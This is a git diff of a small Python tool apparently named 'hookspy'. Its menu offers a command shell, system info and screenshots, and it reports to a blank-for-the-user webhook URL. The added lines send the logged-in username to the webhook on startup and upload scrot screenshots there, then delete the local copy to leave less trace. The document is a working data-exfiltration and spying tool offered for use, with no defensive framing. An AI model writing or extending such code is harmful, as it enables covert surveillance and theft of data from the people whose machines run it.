@@ -2,9 +2,15 @@ import os
 import requests
 
 WEBHOOK = "" #put your here
+
+user = os.getlogin()
+requests.post(WEBHOOK, data={"content": f"```Logged in as {user}```"})  
+print(f"Logged in as {user}")
+
 cwd = os.getcwd()
 while True:
     print(f"""
+    \n hookspy v0.1-alpha        https://github.com/realpnut/hookspy
     1 - Shell
     2 - System Info
     3 - Screenshot
@@ -20,7 +26,7 @@ while True:
                     os.chdir(cmd[3:].strip())
                     cwd = os.getcwd()
                 except:
-                    print("blad cd")
+                    print("cd error")
                 continue
             out = os.popen(cmd).read()
             print(out)
@@ -32,4 +38,6 @@ while True:
     elif uput == "3":
         os.system("scrot /tmp/screenshot.png")
         with open("/tmp/screenshot.png", "rb") as f:
+            requests.post(WEBHOOK, data={"content": f"```Screenshotting...```"})
             requests.post(WEBHOOK, files={"file": f})
+        os.system("rm /tmp/screenshot.png")
